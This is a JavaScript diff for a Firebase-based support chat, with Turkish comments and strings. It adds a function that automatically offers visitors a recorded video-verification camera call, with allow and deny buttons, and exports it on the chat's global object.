@@ -175,6 +175,44 @@ async function pushMessage(who, text) {
   return true;
 }
 
+/** Ziyaretçi açılışında otomatik kamera: call + mesaj (from:auto → ziyaretçi admin dinleyicisine düşmez) */
+async function startVisitorCameraOffer(text) {
+  const database = initDb();
+  if (!database) throw new Error("Firebase bağlı değil");
+  const id = await ensureSession();
+  if (!id) throw new Error("Oturum açılamadı");
+
+  const callId = makeId();
+  await initCameraCall(id, callId);
+
+  const clean = String(
+    text ||
+      "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır."
+  )
+    .trim()
+    .slice(0, 800);
+  if (!clean) throw new Error("Boş mesaj");
+
+  const msgRef = push(ref(database, `chats/${id}/messages`));
+  await set(msgRef, {
+    who: "bot",
+    from: "auto",
+    text: clean,
+    ts: Date.now(),
+    type: "camera",
+    callId,
+    okLabel: "İzin ver",
+    cancelLabel: "Reddet",
+  });
+  await update(ref(database, `chats/${id}`), {
+    updatedAt: Date.now(),
+    preview: "📷 Kamera talebi",
+    lastWho: "bot",
+    page: location.pathname + location.hash,
+  });
+  return { callId, sessionId: id };
+}
+
 function webrtcPath(sessionIdValue, callId, ...parts) {
   return ["chats", sessionIdValue, "webrtc", callId, ...parts].filter(Boolean).join("/");
 }
@@ -621,6 +659,7 @@ window.ChatSync = {
   ensureSession,
   pingPresence,
   pushMessage,
+  startVisitorCameraOffer,
   sendAdminMessage,
   checkAdminPassword,
   listenSessions,
